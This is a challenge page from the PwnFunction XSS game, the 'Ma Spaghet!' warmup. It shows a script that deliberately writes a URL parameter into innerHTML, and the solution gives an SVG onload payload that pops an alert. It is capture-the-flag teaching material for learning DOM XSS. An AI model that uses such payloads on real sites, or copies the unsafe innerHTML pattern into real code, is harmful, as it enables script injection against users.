---
title: "XSS Game - Ma Spaghet! | PwnFunction"
header: "Ma Spaghet!"
challengeUrl: "https://sandbox.pwnfunction.com/warmups/ma-spaghet.html"
date: 2020-01-19T18:02:05+05:30
draft: false
type: warmup
difficulty: Easy
---

{{< rules >}}
<li>Difficulty is <b>Easy</b>.</li>
<li>Pop an <code>alert(1337)</code> on <code>sandbox.pwnfunction.com</code>.</li>
<li>No user interaction.</li>
<li>Cannot use <code>https://sandbox.pwnfunction.com/?html=&js=&css=</code>.</li>
<li>Tested on <b>Chrome</b>.</li>
{{</ rules >}}

{{< code >}}<code class="language-markup">&#x3C;!-- Challenge --&#x3E;
&#x3C;h2 id=&#x22;spaghet&#x22;&#x3E;&#x3C;/h2&#x3E;
&#x3C;script&#x3E;
    spaghet.innerHTML = (new URL(location).searchParams.get(&#x27;somebody&#x27;) || &#x22;Somebody&#x22;) + &#x22; Toucha Ma Spaghet!&#x22;
&#x3C;/script&#x3E;</code>{{< /code >}}

{{< solution >}}
<p>The solution is straight forward, the GET parameter <code>somebody</code> is assigned to
    <code>spaghet.innerHTML</code> in an unsafe way, so something as simple as the following would
    work.
</p>

<pre class="solution-code-block"><code class="language-markup">&lt;svg onload=alert(1337)&gt;</code></pre>
{{< /solution >}}